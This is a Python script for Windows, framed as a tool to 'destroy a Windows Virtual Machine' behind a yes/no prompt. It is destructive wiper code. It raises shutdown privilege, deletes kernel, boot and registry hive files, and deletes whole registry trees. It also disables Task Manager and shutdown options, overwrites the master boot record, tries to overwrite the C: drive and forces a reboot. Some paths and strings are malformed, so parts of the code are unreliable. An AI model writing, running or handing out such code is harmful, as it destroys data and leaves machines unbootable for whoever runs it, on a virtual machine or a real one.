import ctypes
import os
import sys
import subprocess
import time
import random

def destroy_vm():
    # Adjust privileges to allow critical system operations
    privilege_id = 19  # SeShutdownPrivilege
    success = ctypes.windll.ntdll.RtlAdjustPrivilege(privilege_id, 1, 0, ctypes.byref(ctypes.c_bool()))
    
    if success == 0:  # If privilege adjustment was successful
        try:
            # Delete critical system files to render OS unbootable
            critical_files = [
                "C:\\Windows\\System32\\ntoskrnl.exe",
                "C:\\Windows\\System32\\hal.dll",
                "C:\\Windows\\System32\\winload.exe",
                "C:\\Windows\\System32\\config\\SYSTEM",
                "C:\\Windows\\System32\\config\\SOFTWARE"
            ]
            for file in critical_files:
                try:
                    os.remove(file)
                except Exception as e:
                    print(f"Failed to delete {file}: {e}")
            
            # Corrupt the registry to make recovery difficult
            registry_keys = [
                "HKEY_LOCAL_MACHINE\SYSTEM",
                "HKEY_LOCAL_MACHINE\SOFTWARE",
                "HKEY_CURRENT_USER\Software",
                "HKEY_CURRENT_USER\Control Panel",
                "HKEY_CURRENT_USER\Environment"
            ]
            for key in registry_keys:
                subprocess.call(f"reg delete {key} /f", shell=True)
            
            # Disable Task Manager to prevent user intervention
            subprocess.call('reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f', shell=True)
            
            # Change desktop background to indicate destruction
            image_path = "C:\\Windows\\Temp\\destroyed.jpg"
            with open(image_path, "wb") as img_file:
                img_file.write(os.urandom(1024))  # Placeholder for an actual image
            
            subprocess.call(f'reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d {image_path} /f', shell=True)
            subprocess.call('RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters', shell=True)
            
            # Create a popup message indicating that the system is destroyed
            ctypes.windll.user32.MessageBoxW(0, "Your system has been permanently destroyed!", "Destroyed", 1)
            
            # Remove shutdown, restart, and logoff options from the Start menu
            subprocess.call('reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f', shell=True)
            
            # Overwrite the Master Boot Record (MBR) to prevent the system from booting
            with open("\\.\\PhysicalDrive0", "rb+") as drive:
                drive.write(os.urandom(512))  # Overwrite the first 512 bytes (MBR)
            
            # Attempt to wipe the entire C: drive
            with open("C:\\", "wb") as drive:
                for _ in range(100):  # Overwrite parts of the drive
                    drive.write(os.urandom(1048576))  # Write 1MB of random data
            
            # Force restart to apply destructive changes
            ctypes.windll.user32.ExitWindowsEx(0x00000002, 0x00000000)  # Restart with forced flag
        except Exception as e:
            print(f"An error occurred while attempting to destroy the VM: {e}")
    else:
        print("Failed to adjust privileges. Make sure you are running as an administrator.")

if __name__ == "__main__":
    print("Warning: This script will permanently destroy your Windows Virtual Machine.")
    confirmation = input("Are you sure you want to proceed? (yes/no): ")
    
    if confirmation.lower() == "yes":
        try:
            destroy_vm()
        except Exception as e:
            print(f"An error occurred: {e}")
    else:
        print("Operation canceled.")
